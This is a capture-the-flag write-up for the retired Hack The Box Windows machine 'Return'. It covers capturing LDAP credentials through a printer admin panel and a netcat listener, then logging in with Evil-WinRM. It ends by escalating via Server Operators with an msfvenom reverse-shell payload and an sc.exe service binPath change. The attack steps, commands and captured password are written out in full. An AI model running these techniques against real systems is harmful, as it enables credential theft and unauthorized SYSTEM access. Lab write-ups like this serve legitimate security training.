---
title: "Return"
date: 2025-10-04
tags: [windows, active-directory, ldap, privesc, server-operators]
difficulty: easy
platform: HTB
description: "LDAP credential capture from a printer web panel, followed by Server Operators privilege escalation via service binary path modification."
featured: true
---

## Overview

| Field | Details |
|---|---|
| **Machine** | Return |
| **OS** | Windows |
| **Difficulty** | Easy |
| **Status** | Retired |

## TL;DR

- Enumerate with Nmap + enum4linux
- Interact with the printer web panel → capture credentials via LDAP listener
- Connect with Evil-WinRM as `svc-printer`
- Abuse Server Operators group → modify service binary path → SYSTEM shell

---

## Recon

```bash
nmap -sC -sV -oN return.nmap 10.129.102.16
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          (Domain: return.local)
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Windows machine with IIS on port 80, AD LDAP, and WinRM open.

---

## Enumeration

```bash
enum4linux -a 10.129.102.16
```

![enum4linux output](/images/writeups/return/enum4linux-1.png)

Domain is `return`, host is domain-joined. Browsing to port 80 shows an HTB Printer Admin Panel.

![Printer homepage](/images/writeups/return/printerhomepage-2.png)

The **Settings** page is the interesting part:

![Printer settings showing svc-printer and LDAP port 389](/images/writeups/return/printersettings-3.png)

Username `svc-printer` and Server Port `389` (LDAP). Printers store AD credentials to query the user list — we can capture them by pointing the Server Address to our listener.

---

## Exploitation — Credential Capture

```bash
nc -lvnp 389
```

Change the printer's Server Address to your `tun0` IP and save. The printer authenticates back:

![netcat capturing LDAP credentials](/images/writeups/return/nc-4.png)

Credentials: `svc-printer : 1edFg43012!!`

### Evil-WinRM

```bash
evil-winrm -i 10.129.102.16 -u svc-printer -p '1edFg43012!!'
```

![Evil-WinRM shell established](/images/writeups/return/evilwinrm-5.png)

```powershell
type C:\Users\svc-printer\Desktop\user.txt
```

![User flag](/images/writeups/return/userflag-6.png)

---

## Privilege Escalation — Server Operators

```powershell
net user svc-printer
```

![net user output showing Server Operators group](/images/writeups/return/show-net-user-7.png)

`svc-printer` is a member of **Server Operators** — can start/stop services. We modify a service's binary path to run our payload as SYSTEM.

### Generate payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe > shell.exe
```

![msfvenom generating payload](/images/writeups/return/msfvenom-8.png)

### Upload via Evil-WinRM

```powershell
upload shell.exe C:\Users\svc-printer\Desktop\shell.exe
```

![shell uploaded](/images/writeups/return/shell-9.png)

### Metasploit listener

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run
```

![Metasploit multi/handler configured](/images/writeups/return/multiculti-10.png)

### Modify service binary path

```powershell
sc.exe config vss binPath="C:\Users\svc-printer\Desktop\shell.exe"
sc.exe stop vss
sc.exe start vss
```

![sc.exe modifying service path](/images/writeups/return/sc.exec-12.png)

Meterpreter catches the callback:

![Meterpreter session established](/images/writeups/return/meterpreter-13.png)

Migrate to a SYSTEM process:

```
meterpreter > ps
meterpreter > migrate <PID>
meterpreter > shell
```

![NT AUTHORITY\SYSTEM](/images/writeups/return/nt-auth-14.png)

```
type C:\Users\Administrator\Desktop\root.txt
```

![Root flag](/images/writeups/return/root.png)

![Pwned](/images/writeups/return/pwned.png)

---

## Lessons Learned

- Printers and network devices store AD credentials — a rogue LDAP listener is all it takes
- **Server Operators** is a frequently overlooked high-privilege group
- Modifying service binary paths is a reliable, stable privesc vector
- Least-privilege service accounts and network segmentation prevent this entirely
